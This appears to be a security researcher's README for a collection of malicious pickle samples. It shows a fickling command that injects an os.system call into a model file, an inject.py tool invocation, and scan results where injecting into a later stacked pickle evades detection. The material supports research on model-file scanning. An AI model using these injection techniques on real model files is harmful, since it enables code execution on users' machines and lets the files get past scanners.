# MaliciousPickles
Some examples of Malicious Pickles

## TextEmbedding.pt
Stollen from https://catalog.ngc.nvidia.com/orgs/nvidia/models/tacotron2_ljspeech/files
I picked this because it's small and an exmaple of pickles being stacked. This is the "assumed" benign sample

### Loading the pickle
``` python
import pickle
f  = open("TextEmbedding.pt",'rb')
pickle.load(f)
pickle.load(f)
pickle.load(f)
import pickletools
pickletools.dis(f) # this doesn't execute the pickle, but advances the file pointer past a part that rquires a special library
pickle.load(f)
```

## fickling_system_calc.pt
This is what is created by `fickling -i "exec('import os; os.system(\"calc\")')" TextEmbedding.pt > fickling_system_calc.pt`. It will launch calc when the pickle is loaded.
**Note:** Fickling by default only opens the first pickle, so most of the original is lost. This is tracked by https://github.com/trailofbits/fickling/issues/20

```bash
> fickling -s fickling_system_calc.pt
Call to `eval(...)` is almost certainly evidence of a malicious pickle file
```

## coldwaterq_inject_calc.pt
This is what is created using my inject.py that I released durring a presentation I did at DefCon. `python ..\PICKLE_INJECTOR\inject.py TextEmbedding.pt coldwaterq_inject_calc.pt test.py` will show an error, `at position 449, opcode b'\x00' unknown` this is because the end of the file isn't a pickle, but I haven't bothered to figure out what it is, because everything before that is a pickle that can be injected into.

```bash
> fickling -s coldwaterq_inject_calc.pt
Warning: Fickling failed to detect any overtly unsafe code, but the pickle file may still be unsafe.

Do not unpickle this file if it is from an untrusted source!
```

You can see that this isn't detected because fickling is only checking the first pickle since the next one is caught.

## coldwaterq_inject_first_calc.pt
inject.py was modified to ensure the malicious code was injected into the fist pickle. But essentially `python ..\PICKLE_INJECTOR\inject.py TextEmbedding.pt coldwaterq_inject_first_calc.pt test.py` was used and everything was the same as coldwaterq_inject_calc.pt.

```bash
> fickling -s .\coldwaterq_inject_first_calc.pt
Call to `exec(_var0)` is almost certainly evidence of a malicious pickle file
```
